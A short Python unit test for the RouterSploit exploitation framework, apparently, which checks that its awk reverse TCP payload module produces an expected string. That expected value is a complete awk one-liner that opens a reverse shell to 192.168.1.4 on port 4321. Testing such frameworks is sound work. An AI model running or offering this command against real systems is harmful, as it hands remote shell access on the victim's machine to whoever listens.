from routersploit.modules.payloads.cmd.awk_reverse_tcp import Payload
reverse_tcp = 'awk \'BEGIN{s="/inet/tcp/0/192.168.1.4/4321";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)};\''

def test_payload_generation():
    if False:
        for i in range(10):
            print('nop')
    ' Test scenario - payload generation '
    payload = Payload()
    payload.lhost = '192.168.1.4'
    payload.lport = 4321
    assert payload.run() == reverse_tcp